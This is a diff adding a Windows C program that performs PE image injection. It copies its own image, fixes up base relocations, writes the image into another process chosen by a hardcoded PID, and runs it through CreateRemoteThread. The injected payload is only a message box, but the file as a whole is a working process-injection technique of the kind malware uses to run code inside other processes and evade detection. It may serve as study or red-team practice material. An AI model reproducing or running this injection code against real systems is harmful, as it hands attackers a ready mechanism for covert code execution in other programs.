@@ -1,0 +1,39 @@
+#include<stdio.h>
+#include<Windows.h>
+typedef struct BASE_RELOCATION_ENTRY {
+	USHORT Offset : 12;
+	USHORT Type : 4;
+}BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
+DWORD InjectionEntryPoint() {
+	CHAR moduleName[128] = "";
+	GetModuleFileNameA(NULL,moduleName,sizeof(moduleName));
+	MessageBoxA(NULL,moduleName,"pe Injection",NULL);
+	return 0;
+}
+int main() {
+	PVOID imageBase = GetModuleHandle(NULL);
+	PIMAGE_DOS_HEADER dosheader = (PIMAGE_DOS_HEADER)imageBase;
+	PIMAGE_NT_HEADERS ntheader = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosheader->e_lfanew);
+	PVOID localImage = VirtualAlloc(NULL, ntheader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(localImage, imageBase, ntheader->OptionalHeader.SizeOfImage);
+	HANDLE targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 18276);
+	PVOID targetImage = VirtualAllocEx(targetProcess, NULL, ntheader->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	DWORD_PTR delta = (DWORD_PTR)targetImage - (DWORD_PTR)imageBase;
+	PIMAGE_BASE_RELOCATION relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+	DWORD relocationEntriesCount = 0;
+	PDWORD_PTR patchedAddress;
+	PBASE_RELOCATION_ENTRY relocationRVA = NULL;
+	while (relocationTable->SizeOfBlock > 0) {
+		relocationEntriesCount = (relocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(USHORT);
+		relocationRVA = (PBASE_RELOCATION_ENTRY)(relocationTable + 1);
+		for (short i = 0; i < relocationEntriesCount; i++) {
+			if (relocationRVA[i].Offset) {
+				patchedAddress = (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable->VirtualAddress + relocationRVA[i].Offset);
+				*patchedAddress += delta;
+			}
+		}
+		relocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable->SizeOfBlock);
+	}
+	WriteProcessMemory(targetProcess,targetImage,localImage,ntheader->OptionalHeader.SizeOfImage,NULL);
+	CreateRemoteThread(targetProcess,NULL,0,(LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint+delta),NULL,0,NULL);
+}
